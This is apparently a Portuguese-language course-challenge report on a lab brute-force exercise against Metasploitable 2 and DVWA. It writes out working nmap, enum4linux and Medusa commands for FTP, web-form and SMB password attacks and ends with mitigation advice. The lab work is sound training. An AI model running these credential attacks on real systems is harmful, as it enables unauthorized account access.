# Ethical-Hacker
Curso Santander Cibersegurança 2025
Desafio
Data do teste: 29/11/2025
Equipe responsável: Red Team / Ricardo Tassini
Objetivo do teste: Desafio Santander Cibersegurança 2025 
Implementar, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (por exemplo, Metasploitable 2 e DVWA), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.
Configurar o ambiente: duas VMs (Kali Linux e Metasploitable 2) no VirtualBox, com rede interna (host-only).
Executar ataques simulados: força bruta em FTP, automação de tentativas em formulário web (DVWA) e password spraying em SMB com enumeração de usuários.
Documentar os testes: wordlists simples, comandos utilizados, validação de acessos e recomendações de mitigação.
 
Oracle Virtual Box: Criadas as máquinas Kali Linux e Metasploitable 2
 
 


Endereços IP
Kali 
 

Metasploitable
 









Serviços e portas abertas no Metasploitable utilizando comando NMAP
nmap -F -sV 192.168.18.4 (Scan Rápido - Apenas portas mais comuns)
 
 
Criação da lista de usuários 
Comando: echo -e “user\nmsfadmin\nadmin\nroot” > users.txt
 
 
Criação da lista de senhas 
Comando: echo -e “123456\npassword\nqwerty\nmsfadmin” > pass.txt
 
 
Ataque na Metasploitable, serviço FTP, utilizando a ferramenta MEDUSA (Força Bruta)
Comando: medusa -h 192.168.18.4 -U users.txt -P pass.txt -M ftp – t 6
 
Obtive sucesso com usuário msfadmin e senha msfadmin
Testando a conexão FTP com o usuário msfadmin e obtendo o acesso
 
Ataque na Metasploitable, formulário web (DVWA), utilizando a ferramenta MEDUSA (Força Bruta)
Tenho acesso a página DVWA, tela de login
 
Clicando em F12, abrimos o painel do desenvolvedor.
Informando um nome de usuário e senha aleatórios, conseguimos identificar os nomes de campos utilizados no formulário e que serão utilizados no ataque de força bruta.
Clicando no método POST abre-se uma janela lateral onde seleciona a aba REQUEST onde podemos identificar os nomes dos campos e conteúdo
 
Outa informação importante é a o recebimento da mensagem “Login Failed” informando que não tenho a credencial correta obter o acesso.
 

Utiliza-se a ferramenta MEDUSA com o comando:
Medusa -h 192.168.18.4 -U users.txt -P pass.txt -M http \
-m PAGE: ‘/dvwa/login.php’ \
-m FORM: ‘username=^USER^&password=^PASS^&Login=Login’ \
-m ‘FAIL=Login failed’ -t 6
 
Acessando o formulário e informando o usuário e senha que tive sucesso na força bruta.
 

 
Ataque: password spraying em SMB com enumeração de usuários.
Utiliza a ferramenta enum4linux para extrair as informações
enum4linux -a 192.168.18.4 | tee enum4_output.txt
ao executar esse comando, ele gravará as informações no arquivo enum4_output.txt
Comando executado com sucesso
 
Usamos o comando: less enum4_output.txt para ver o conteúdo do arquivo
Abaixo temos a lista de usuários existentes no alvo:
 
Criando a lista de usuários:
 

Criando a lista de senhas:
 
Utilizando a ferramenta MEDUSA para ataque SMB:
Medusa -h 192.168.18.4 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
 
Resultado: ACCOUNT FOUND: User: msfadmin; Password: msfadmin
Para testar se realmente conseguimos os dados verdadeiros, utilizarei o comando smbclient
smbclient -L //192.168.18.4 -U msfadmin
 
Consegui o acesso, ataque bem-sucedido!
Para mitigar os riscos temos as opções abaixo:
•	Autenticação Multifator: é muito eficaz, pois mesmo se o hacker tiver as informações de login e senha, ele não consegue passar pela segunda barreira.
•	Senhas fortes e expiradas regularmente: política de criação de senhas misturando letras minúsculas, maiúsculas, números e caracteres especiais. 
•	Bloqueio de IPs após multiplas tentativas de login
•	Monitoramento inteligente de logs e comportamento
•	Segmentação das redes
•	Auditoria regulares

